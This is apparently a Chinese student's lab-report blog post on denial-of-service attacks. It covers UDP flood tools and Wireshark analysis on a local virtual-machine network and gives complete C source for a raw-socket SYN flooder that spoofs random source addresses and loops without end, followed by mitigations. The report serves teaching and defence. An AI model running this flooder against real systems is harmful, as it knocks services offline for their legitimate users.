<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>DDos | Reus09&#39;s Blog</title>
<meta name="keywords" content="ddos">
<meta name="description" content="拒绝服务攻击 0x01 实验目的 使用udp flood、阿拉丁等工具，分组展开攻击并利用wireshark分析。 编程实现SYN Flood攻击。 0x02 实验前提">
<meta name="author" content="Reus09">
<link rel="canonical" href="http://www.reus09.top/posts/tech/ddos/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="DDos" />
<meta property="og:description" content="拒绝服务攻击 0x01 实验目的 使用udp flood、阿拉丁等工具，分组展开攻击并利用wireshark分析。 编程实现SYN Flood攻击。 0x02 实验前提" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://www.reus09.top/posts/tech/ddos/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-11-10T15:49:04+08:00" />
<meta property="article:modified_time" content="2022-09-11T15:49:04+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="DDos"/>
<meta name="twitter:description" content="拒绝服务攻击 0x01 实验目的 使用udp flood、阿拉丁等工具，分组展开攻击并利用wireshark分析。 编程实现SYN Flood攻击。 0x02 实验前提"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "📚文章",
      "item": "http://www.reus09.top/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "👨🏻‍💻技术",
      "item": "http://www.reus09.top/posts/tech/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "DDos",
      "item": "http://www.reus09.top/posts/tech/ddos/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "DDos",
  "name": "DDos",
  "description": "拒绝服务攻击 0x01 实验目的 使用udp flood、阿拉丁等工具，分组展开攻击并利用wireshark分析。 编程实现SYN Flood攻击。 0x02 实验前提",
  "keywords": [
    "ddos"
  ],
  "articleBody": "拒绝服务攻击 0x01 实验目的 使用udp flood、阿拉丁等工具，分组展开攻击并利用wireshark分析。 编程实现SYN Flood攻击。 0x02 实验前提知识 DoS（Denial of Service）攻击 凡是能导致合法用户不能正常访问网络服务的行为都可视为拒绝服务攻击。 DDoS（Distributed Denial of Service）攻击 借助数百、数千被植入攻击守护进程的主机，对目标展开的“集团式”拒绝服务攻击，通常针对高带宽、高性能网站 DDoS攻击类型 基于操作系统/应用软件漏洞的DDoS攻击；\n基于协议漏洞的网络层DDoS攻击；\n利用协议漏洞，导致目标资源被大幅占用。是最常见的攻击方式，但需要一定规模的傀儡主机。 面向网络资源的DDoS攻击；\n攻击者控制傀儡机同时发送正常报文，导致目标资源被耗尽。这种攻击方式最难防范，攻击者也需要控制较大规模的主机或服务器 Ping of Death 攻击点：操作系统协议栈没有处理例外情况的设计缺陷。 原理：利用了协议实现时的漏洞（CVE-1999-0128）。ICMP协议用于诊断网络状况（端点是否可达等）。正常情况下，A向B发送ICMP echo request，B收到后返回ICMP echo reply。则A知道，B在线、可达。ICMP包除了包头外，还可以携带数据。这些数据不用于进一步处理，仅辅助诊断网络状况（根据收到响应的时间判断网络是否通畅）。攻击者制造超长数据包，使得数据包超过65535字节上限。没有异常处理的协议栈，收到这样的数据包，可能会由于缓存区溢出而崩溃。（IP数据包的最大长度为65535B，IP首部长度为20B，ICMP首部为8字节，ICMP包最大数据长度为：65535-20-8=65507B. Smurf 以目标IP为源地址，以广播地址为目地址，发送ICMP Echo请求。广播地址对应网络上的每台主机都能收到请求，并向目标发送ICMP Reply，导致目标被大量应答占据资源。 UdpSmurf 利用7号(echo)端口。根据协议，若端口开放，则回送应答UDP数据包。若端口关闭，则发送一个ICMP报文（目标不可达）。 攻击者以广播地址为目标地址，以受害者地址为源地址，使得大量应答包送往受害者。 TCP SYN Flood攻击 通过虚假的数据包，造成目标保存大量半开TCP连接。 管理TCP连接需要系统资源，系统能忍受的半开连接有上限。 当半开连接达到一定数目时，系统将不再接收新的连接请求。 正常的服务请求因此得不到响应。 TCP正常连接过程 A发送SYN包后死机或掉线 TCP协议头\nTCP伪首部\n伪首部共有 12 字节，包含 IP 协议头部的一些字段，有如下信息：32位源IP地址、32位目的IP地址、8位保留字节(置0)、8位传输层协议号(TCP是6，UDP是17)、16位TCP报文长度(TCP首部+数据)。 TCP 协议校验和计算三部分：TCP伪首部 + TCP头部 + TCP数据。 IP 头部\nTCP 协议通过一种名为 三次握手 的过程来建立客户端与服务端的连接，三次握手 过程的原理如图\n建立连接三次握手过程如下：\n客户端需要发送一个 SYN包 给服务端（包含了客户端初始化序列号），并且将连接的状态设置为 SYN_SENT，这个过程由 connect() 系统调用完成。\n服务端接收到客户端发送过来的 SYN包 后，回复一个 SYN+ACK包 给客户端（包含了服务端初始化序列号），并且设置连接的状态为 SYN_RCVD。\n客户端接收到服务端发送过来的 SYN+ACK包 后，设置连接状态为 ESTABLISHED（表示连接已经建立），并且回复一个 ACK包 给服务端。\n服务端接收到客户端发送过来的 ACK包 后，将连接状态设置为 ESTABLISHED（表示连接已经建立）。\n当 三次握手 过程完成后，一个 TCP 连接就此建立完成。\nSYN-flood攻击大概有以下三种攻击方式：\nDirect Attack 攻击方使用固定的源地址发起攻击，这种方法对攻击方的消耗最小。 Spoofing(欺骗) Attack 攻击方使用变化的源地址发起攻击，这种方法需要攻击方不停地修改源地址，实际上消耗也不大。 Distributed Direct Attack 这种攻击主要是使用僵尸网络进行固定源地址的攻击 0x03 实验环境 部署于同一局域网下 攻击机 网络安全实验 Windows xp IP:192.168.195.131 MAC :00-0C-29-06-65-C9 靶机 汇编 Windows xp IP:192.168.195.135 MAC : 00-0c-29-19-ba-6e 程序运行机器 Ubuntu 16 网关 IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 工具： udp-Flood 阿拉丁 visual studio code wireshark 0x04 工具分析 udp_Flood 首先看一下靶机IP:192.168.195.135开放的端口\n发现TCP中21、22、80端口均开启，UDP开启445,500端口 首先在攻击机打开udp_flood工具，对80端口进行攻击。\n每秒发11个包 然后在靶机中打开Wireshark进行抓包\n容易发现，攻击机向靶机每发一个UDP包，靶机就会回应一个ICMP包\n不难发现，udp包的数据流都没有问题，所有udp包的大小相同，协议相同，短时间发送大量的包\n但是服务器回显ICMP显示Port Unreachable\n这是因为服务器响应发送到其中一个端口的UDP数据包所采取的步骤。在正常情况下，当服务器在特定端口接收到UDP数据包时，会经过两个步骤：\n服务器首先检查是否正在运行正在侦听指定端口的请求的程序。 如果没有程序在该端口接收数据包，则服务器使用ICMP（ping）数据包进行响应，以通知发送方目的地不可达。 80端口并没有UDP进行监听，因此服务器会返回一个ICMP包，告诉发送方不可到达。\n这里利用UDP开始监听的445端口进行实验\nudp发送的包同样没有问题，大小相同，均为83。 这里查看一下udp_flood攻击之前的时间\n然后打开udp_flood，攻击80端口 可以看到阿拉丁udp_flood攻击之后，访问百度会丢包，然后平均时间也增加了 因此，udp_flood一定程度上会阻碍服务器的访问速度。 因此，在udp_flood攻击中，攻击者可发送大量伪造源IP地址的小udp包。由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。这种攻击方式消耗的是攻击者与靶机方两方资源的比拼。\n阿拉丁 首先查看一下靶机开放的端口 在攻击机中打开阿拉丁udp洪水攻击器 首先工具靶机的80端口 便于测试，这里进行一般udp攻击 在靶机中跟据Wireshark进行抓包 分析一下udp数据包 可以很明显的看到udp数据包的源IP、MAC和目的IP、MAC都是正确的，唯一异常的是udp传送的数据包Data的数据过长，为3000byte, 同时udp因为超过1500会分片传输，大大提高了攻击的效率。 将端口改为445 分析一下udp的结构 发现也完全符合预期，和udp_flood相比，只是包的大小变大了，DDOS的威力也更强大了。 这里查看一下工具前 ping www.baidu.com的时延 攻击靶机的80端口 很明显看到攻击后的udp攻击使得服务器的最高时延增加。 因此，udp_flood一定程度上会阻碍服务器的访问速度。 由此可以知道，udp_flood工具和阿拉丁的原理相同，都是利用UDP洪水攻击，大批量的消耗资源来进行DDOS攻击。 攻击效果的话，如果带宽、流量足够大的话，服务器的会不断的接受包、然后瘫痪、无法正常上网。 0x05 SYN-Flood 编程实现 这里用套接字socket的方法来实现syn-flood攻击\n只需要构造好一个TCP包，指定好包中IP.flags=0x02(为SYN包)。\n我们这里在ubuntu 16 的环境中编译我们写好的程序\n首先查看一下靶机(IP : 192.168.195.135)的开放端口\n发现开启了21、22、80端口 在程序中，对192.168.195.135的80端口进行攻击\n因为程序是无限循环发送，需要手动终止 与此同时，利用Wireshark在靶机进行抓包\n可以看到程序随机产生大量的虚假地址和虚假的端口对靶机的80端口进行访问，因为地址和端口都为虚假的，所以大量的tcp连接靶机无法对其ack回复。 产生大量的syn半连接，导致服务器载荷过大，从而崩溃。\n查看此时的syn状态。 可以很清晰的看到，程序产生了大量的syn半连接，来自不同的虚假ip地址和端口 查看攻击前 ping www.baidu.com 的效果\n攻击其21端口 发现ping www.baidu.com 已经不能Ping通 同时很明显的感受到Windows xp因为受到SYN攻击，因此运行不流畅，卡顿相当严重。\n实际上，SYN-flood攻击就是 构造大量的SYN包、里面填充虚假的IP、MAC地址，来造成服务器产生大量的半连接，从而造成服务器运行瘫痪。\n完整代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 #include #include #include #include #include #include #include #include #include #include #include #include #include #include // ip 报头 struct iphdr { unsigned char ver_and_hdrlen;// 版本号与IP头部长度 unsigned char tos; // 服务类型 unsigned short total_len; // 总长度 unsigned short id; // IP包ID unsigned short flags; // 标志位(包括分片偏移量) unsigned char ttl; // 生命周期 unsigned char protocol; // 上层协议 unsigned short checksum; // 校验和 unsigned int srcaddr; // 源IP地址 unsigned int dstaddr; // 目标IP地址 }; // tcp 报头 struct tcphdr { unsigned short sport; // 源端口 unsigned short dport; // 目标端口 unsigned int seq; // 序列号 unsigned int ack_seq; // 确认号 unsigned char len; // 首部长度 unsigned char flag; // 标志位 unsigned short win; // 窗口大小 unsigned short checksum; // 校验和 unsigned short urg; // 紧急指针 }; //TCP的伪报头，在计算TCP的校验和时需要包含 struct pseudohdr { unsigned int saddr; //源目的IP unsigned int daddr; // 目的IP char zeros; // 8位保留字符 一般置0 char protocol;// 协议 unsigned short length; // 长度 }; // 这个是计算校验和的函数 unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u003e 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u003e\u003e 16) + (cksum \u0026 0xffff); cksum += (cksum \u003e\u003e 16); return (unsigned short )(~cksum); } // 通过传入的源 IP 地址和目标 IP 地址初始化 IP 头部结构。 void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u003ever_and_hdrlen = (4\u003c\u003c4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u003etos = 0; ip-\u003etotal_len = htons(len); ip-\u003eid = 1; ip-\u003eflags = 0x40; ip-\u003ettl = 255; ip-\u003eprotocol = IPPROTO_TCP; ip-\u003echecksum = 0; ip-\u003esrcaddr = srcaddr; // 源IP地址 ip-\u003edstaddr = dstaddr; // 目标IP地址 } // 初始化 tcp 包 void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u003esport = htons(rand() % 16383 + 49152); // 随机生成一个端口 tcp-\u003edport = htons(dport); // 目标端口 tcp-\u003eseq = htonl(rand() % 90000000 + 2345 ); // 随机生成一个初始化序列号 tcp-\u003eack_seq = 0; tcp-\u003elen = (sizeof(struct tcphdr) / 4 \u003c\u003c 4 | 0); tcp-\u003eflag = 0x02; // 0x02 代表 是syn 包，tcp三次连接请求的开始 tcp-\u003ewin = htons(1024); tcp-\u003echecksum = 0; tcp-\u003eurg = 0; } // 初始化 tcp 伪报头 void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u003ezeros = 0; pseudo-\u003eprotocol = IPPROTO_TCP; pseudo-\u003elength = htons(sizeof(struct tcphdr)); pseudo-\u003esaddr = srcaddr; pseudo-\u003edaddr = dstaddr; } // 通过 目标IP地址 和 目标端口 生成一个 SYN包，保存到参数 packet 中，并且返回包的大小。 int make_syn_packet(char *packet, int pkt_len, unsigned int daddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP 头部 struct tcphdr tcp; //TCP 头部 struct pseudohdr pseudo; //TCP 伪头部 unsigned int saddr = rand(); len = sizeof(ip) + sizeof(tcp); // 初始化头部信息 init_ip_header(\u0026ip, saddr, daddr); init_tcp_header(\u0026tcp, dport); init_pseudo_header(\u0026pseudo, saddr, daddr); //计算IP校验和 ip.checksum = checksum((u_short *)\u0026ip, sizeof(ip)); // 计算TCP校验和 bzero(buf, sizeof(buf)); memcpy(buf , \u0026pseudo, sizeof(pseudo)); // 复制TCP伪头部 memcpy(buf + sizeof(pseudo), \u0026tcp, sizeof(tcp)); // 复制TCP头部 tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026tcp, sizeof(tcp)); return len; } // 创造原始套接字 int make_raw_socket() { int fd; int on = 1; // 创建一个原始套接字, 指定其关注TCP协议 fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // 设置需要手动构建IP头部 if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026on, sizeof(on)) \u003c 0) { close(fd); return -1; } /* 在调用 socket() 函数创建套接字时，指定第二个参数为 SOCK_RAW，表示创建的套接字为原始套接字。然后调用 setsockopt() 函\t数设置 IP 头部由我们自己构建 */ return fd; } // 传入原始套接字、目标IP地址和目标端口，然后通过调用 sendto() 函数向服务端发送一个 SYN包 int send_syn_packet(int sockfd, unsigned int addr, unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\"%d已攻击!\\n\",addr); pkt_len = make_syn_packet(packet, 256, addr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026skaddr, sizeof(struct sockaddr)); } // 主函数 int main(int argc, char *argv[]) { unsigned int addr; unsigned short port; int sockfd; if (argc \u003c 3) { fprintf(stderr, \"Usage: synflood \\n\"); exit(1); } // argv[1] 目的地址 // argc[2] 目的端口 addr = inet_addr(argv[1]); port = atoi(argv[2]); // 判断端口是否 存在 if (port \u003c 0 || port \u003e 65535) { fprintf(stderr, \"Invalid destination port number: %s\\n\", argv[2]); exit(1); } // 开启socket sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \"Failed to make raw socket\\n\"); exit(1); } // for 无限循环，发送syn包 for (;;) { if (send_syn_packet(sockfd, addr, port) \u003c 0) { fprintf(stderr, \"Failed to send syn packet\\n\"); } } close(sockfd); return 0; } 0x06 实验结论 udp_flood攻击就是构造大量的udp包(可以携带少量数据，也可以携带大量数据，携带数据量越大对服务器的载荷承受就越严重)，占用服务器大量的处理内存，从而引起服务器崩溃。\nSYN-Flood三种攻击方式\nDirect Attack 攻击方使用固定的源地址发起攻击，这种方法对攻击方的消耗最小。 Spoofing(欺骗) Attack 攻击方使用变化的源地址发起攻击，这种方法需要攻击方不停地修改源地址，实际上消耗也不大。 Distributed Direct Attack 这种攻击主要是使用僵尸网络进行固定源地址的攻击 防御手段\nUdp_Flood\n大多数操作系统部分限制了ICMP报文的响应速率，以中断需要ICMP响应的DDoS攻击。这种缓解的一个缺点是在攻击过程中，合法的数据包也可能被过滤。如果UDP Flood的容量足够高以使目标服务器的防火墙的状态表饱和，则在服务器级别发生的任何缓解都将不足以应对目标设备上游的瓶颈。 判断包大小，如果是大包攻击则使用防止UDP碎片方法：根据攻击包大小设定包碎片重组大小，通常不小于1500。在极端情况下，可以考虑丢弃所有UDP碎片。 SYN-Flood\n缩短超时（SYN Timeout）时间\n由于SYN Flood攻击的效果取决于服务器上保持的SYN半连接数，这个值=SYN攻击的频度 x SYN Timeout，所以通过缩短从接收到SYN报文到确定这个报文无效并丢弃改连接的时间，例如设置为20秒以下，可以成倍的降低服务器的负荷。但过低的SYN Timeout设置可能会影响客户的正常访问。\n注意：缩短SYN Timeout时间仅在对方攻击频度不高的情况下生效\n增加最大半连接数\nMore Actions在Linux中执行命令”sysctl -agrep net.ipv4.tcp_max_syn_backlog”可以查看最大半连接数，一般来说大小为128，这个默认值对于Web服务器来说是远远不够的，一次简单的SYN攻击就足以将其完全占用。 因此，防御DOS攻击最简单的办法就是增大这个默认值，在Linux中执行命令”sysctl -w et.ipv4.tcp_max_syn_backlog=3000”，这样就可以将队列SYN最大半连接数容量值改为3000了 过滤网关防护\n一种方式是防止墙确认连接的有效性后，防火墙才会向内部服务器发起SYN请求。防火墙代服务器发出的SYN ACK包使用的序列号为c, 而真正的服务器回应的序列号为c’, 这样，在每个数据报文经过防火墙的时候进行序列号的修改。\n另一种方式是防火墙确定了连接的安全后，会发出一个safe reset命令，client会进行重新连接，这时出现的syn报文会直接放行。这样不需要修改序列号了。但是，client需要发起两次握手过程，因此建立连接的时间将会延长。\nSYN cookies技术\n给每一个请求连接的IP地址分配一个Cookie，如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，并记录地址信息，以后从这个IP地址来的包会被一概丢弃。这样做的结果也可能会影响到正常用户的访问。 ",
  "wordCount" : "5934",
  "inLanguage": "en",
  "datePublished": "2021-11-10T15:49:04+08:00",
  "dateModified": "2022-09-11T15:49:04+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://www.reus09.top/posts/tech/ddos/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://www.reus09.top" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://www.reus09.top/search" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/" title="主页">
                    <span>主页</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/posts" title="文章">
                    <span>文章</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/archives/" title="时间轴">
                    <span>时间轴</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/categories" title="分类">
                    <span>分类</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/tags" title="标签">
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/about" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://www.reus09.top">Home</a>&nbsp;»&nbsp;<a href="http://www.reus09.top/posts/">📚文章</a>&nbsp;»&nbsp;<a href="http://www.reus09.top/posts/tech/">👨🏻‍💻技术</a></div>
    <h1 class="post-title">
      DDos
    </h1>
    <div class="post-meta"><span title='2021-11-10 15:49:04 +0800 +0800'>2021-11-10</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e6%8b%92%e7%bb%9d%e6%9c%8d%e5%8a%a1%e6%94%bb%e5%87%bb" aria-label="拒绝服务攻击">拒绝服务攻击</a><ul>
                            
                    <li>
                        <a href="#0x01-%e5%ae%9e%e9%aa%8c%e7%9b%ae%e7%9a%84" aria-label="0x01 实验目的">0x01 实验目的</a><ul>
                            <ul>
                            <ul>
                            
                    <li>
                        <a href="#%e4%bd%bf%e7%94%a8udp-flood%e9%98%bf%e6%8b%89%e4%b8%81%e7%ad%89%e5%b7%a5%e5%85%b7%e5%88%86%e7%bb%84%e5%b1%95%e5%bc%80%e6%94%bb%e5%87%bb%e5%b9%b6%e5%88%a9%e7%94%a8wireshark%e5%88%86%e6%9e%90" aria-label="使用udp flood、阿拉丁等工具，分组展开攻击并利用wireshark分析。">使用udp flood、阿拉丁等工具，分组展开攻击并利用wireshark分析。</a></li>
                    <li>
                        <a href="#%e7%bc%96%e7%a8%8b%e5%ae%9e%e7%8e%b0syn-flood%e6%94%bb%e5%87%bb" aria-label="编程实现SYN Flood攻击。">编程实现SYN Flood攻击。</a></li></ul>
                        </ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#0x02-%e5%ae%9e%e9%aa%8c%e5%89%8d%e6%8f%90%e7%9f%a5%e8%af%86" aria-label="0x02 实验前提知识">0x02 实验前提知识</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#dosdenial-of-service%e6%94%bb%e5%87%bb" aria-label="DoS（Denial of Service）攻击">DoS（Denial of Service）攻击</a><ul>
                            
                    <li>
                        <a href="#%e5%87%a1%e6%98%af%e8%83%bd%e5%af%bc%e8%87%b4%e5%90%88%e6%b3%95%e7%94%a8%e6%88%b7%e4%b8%8d%e8%83%bd%e6%ad%a3%e5%b8%b8%e8%ae%bf%e9%97%ae%e7%bd%91%e7%bb%9c%e6%9c%8d%e5%8a%a1%e7%9a%84%e8%a1%8c%e4%b8%ba%e9%83%bd%e5%8f%af%e8%a7%86%e4%b8%ba%e6%8b%92%e7%bb%9d%e6%9c%8d%e5%8a%a1%e6%94%bb%e5%87%bb" aria-label="凡是能导致合法用户不能正常访问网络服务的行为都可视为拒绝服务攻击。">凡是能导致合法用户不能正常访问网络服务的行为都可视为拒绝服务攻击。</a></li></ul>
                    </li>
                    <li>
                        <a href="#ddosdistributed-denial-of-service%e6%94%bb%e5%87%bb" aria-label="DDoS（Distributed Denial of Service）攻击">DDoS（Distributed Denial of Service）攻击</a><ul>
                            
                    <li>
                        <a href="#%e5%80%9f%e5%8a%a9%e6%95%b0%e7%99%be%e6%95%b0%e5%8d%83%e8%a2%ab%e6%a4%8d%e5%85%a5%e6%94%bb%e5%87%bb%e5%ae%88%e6%8a%a4%e8%bf%9b%e7%a8%8b%e7%9a%84%e4%b8%bb%e6%9c%ba%e5%af%b9%e7%9b%ae%e6%a0%87%e5%b1%95%e5%bc%80%e7%9a%84%e9%9b%86%e5%9b%a2%e5%bc%8f%e6%8b%92%e7%bb%9d%e6%9c%8d%e5%8a%a1%e6%94%bb%e5%87%bb%e9%80%9a%e5%b8%b8%e9%92%88%e5%af%b9%e9%ab%98%e5%b8%a6%e5%ae%bd%e9%ab%98%e6%80%a7%e8%83%bd%e7%bd%91%e7%ab%99" aria-label="借助数百、数千被植入攻击守护进程的主机，对目标展开的“集团式”拒绝服务攻击，通常针对高带宽、高性能网站">借助数百、数千被植入攻击守护进程的主机，对目标展开的“集团式”拒绝服务攻击，通常针对高带宽、高性能网站</a></li></ul>
                    </li>
                    <li>
                        <a href="#ddos%e6%94%bb%e5%87%bb%e7%b1%bb%e5%9e%8b" aria-label="DDoS攻击类型">DDoS攻击类型</a></li>
                    <li>
                        <a href="#ping-of-death" aria-label="Ping of Death">Ping of Death</a></li>
                    <li>
                        <a href="#smurf" aria-label="Smurf">Smurf</a></li>
                    <li>
                        <a href="#udpsmurf" aria-label="UdpSmurf">UdpSmurf</a></li>
                    <li>
                        <a href="#tcp-syn-flood%e6%94%bb%e5%87%bb" aria-label="TCP SYN Flood攻击">TCP SYN Flood攻击</a></li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#0x03-%e5%ae%9e%e9%aa%8c%e7%8e%af%e5%a2%83" aria-label="0x03 实验环境">0x03 实验环境</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#%e9%83%a8%e7%bd%b2%e4%ba%8e%e5%90%8c%e4%b8%80%e5%b1%80%e5%9f%9f%e7%bd%91%e4%b8%8b" aria-label="部署于同一局域网下">部署于同一局域网下</a></li>
                    <li>
                        <a href="#%e6%94%bb%e5%87%bb%e6%9c%ba-%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8%e5%ae%9e%e9%aa%8c-windows-xp" aria-label="攻击机 网络安全实验 Windows xp">攻击机 网络安全实验 Windows xp</a></li>
                    <li>
                        <a href="#%e9%9d%b6%e6%9c%ba-%e6%b1%87%e7%bc%96-windows-xp" aria-label="靶机 汇编 Windows xp">靶机 汇编 Windows xp</a></li>
                    <li>
                        <a href="#%e7%a8%8b%e5%ba%8f%e8%bf%90%e8%a1%8c%e6%9c%ba%e5%99%a8-ubuntu-16" aria-label="程序运行机器 Ubuntu 16">程序运行机器 Ubuntu 16</a></li>
                    <li>
                        <a href="#%e7%bd%91%e5%85%b3" aria-label="网关">网关</a></li>
                    <li>
